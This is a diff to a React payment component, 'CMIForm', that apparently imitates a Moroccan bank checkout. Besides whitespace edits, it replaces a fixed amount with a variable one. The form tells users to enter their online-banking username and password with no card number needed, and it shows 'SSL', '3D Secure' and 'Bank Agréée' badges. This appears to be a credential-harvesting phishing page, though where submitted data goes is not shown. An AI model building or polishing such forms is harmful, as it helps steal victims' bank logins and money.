@@ -1,6 +1,6 @@
 import React, { useState } from 'react';
 
-const CMIForm = ({ paymentData, setPaymentData, onSubmit }) => {
+const CMIForm = ({ paymentData, setPaymentData, onSubmit,montant }) => {
   const [selectedBank, setSelectedBank] = useState('cih');
 
   const banks = [
@@ -43,12 +43,12 @@ const CMIForm = ({ paymentData, setPaymentData, onSubmit }) => {
       <div className="redirect-notice">
         <div className="info-icon">
           <svg width="10" height="10" viewBox="0 0 10 10" fill="#fff">
-            <circle cx="5" cy="3" r="1"/>
-            <rect x="4" y="5" width="2" height="4" rx="1"/>
+            <circle cx="5" cy="3" r="1" />
+            <rect x="4" y="5" width="2" height="4" rx="1" />
           </svg>
         </div>
         <div className="notice-text">
-          Vous allez être authentifié via votre <strong>banque marocaine</strong>. 
+          Vous allez être authentifié via votre <strong>banque marocaine</strong>.
           Saisissez votre identifiant et mot de passe bancaire. Aucun numéro de carte requis.
         </div>
       </div>
@@ -56,7 +56,7 @@ const CMIForm = ({ paymentData, setPaymentData, onSubmit }) => {
       <div className="section-label">Choisissez votre banque</div>
       <div className="bank-grid">
         {banks.map(bank => (
-          <div 
+          <div
             key={bank.id}
             className={`bank-item ${selectedBank === bank.id ? 'selected' : ''}`}
             onClick={() => handleBankSelect(bank.id)}
@@ -76,7 +76,7 @@ const CMIForm = ({ paymentData, setPaymentData, onSubmit }) => {
       </div>
 
       <div className="section-label">Authentification bancaire</div>
-      
+
       <form onSubmit={(e) => { e.preventDefault(); onSubmit(); }}>
         <div className="form-group">
           <label className="form-label">Identifiant bancaire ({banks.find(b => b.id === selectedBank)?.name})</label>
@@ -117,27 +117,27 @@ const CMIForm = ({ paymentData, setPaymentData, onSubmit }) => {
         </div>
 
         <button type="submit" className="pay-btn cmi-pay-btn">
-          Confirmer le paiement — 150.00 MAD
+          Confirmer le paiement — {montant} MAD
         </button>
 
         <div className="secure-badges">
           <div className="badge">
             <svg className="badge-icon" viewBox="0 0 16 16">
-              <rect x="3" y="7" width="10" height="8" rx="2"/>
-              <path d="M5 7V5a3 3 0 0 1 6 0v2"/>
+              <rect x="3" y="7" width="10" height="8" rx="2" />
+              <path d="M5 7V5a3 3 0 0 1 6 0v2" />
             </svg>
             SSL 256-bit
           </div>
           <div className="badge">
             <svg className="badge-icon" viewBox="0 0 16 16">
-              <path d="M8 2L3 4v5c0 3 2.5 5 5 6 2.5-1 5-3 5-6V4z"/>
+              <path d="M8 2L3 4v5c0 3 2.5 5 5 6 2.5-1 5-3 5-6V4z" />
             </svg>
             3D Secure
           </div>
           <div className="badge">
             <svg className="badge-icon" viewBox="0 0 16 16">
-              <circle cx="8" cy="8" r="6"/>
-              <path d="M6 8l2 2 3-3"/>
+              <circle cx="8" cy="8" r="6" />
+              <path d="M6 8l2 2 3-3" />
             </svg>
             Bank Agréée
           </div>
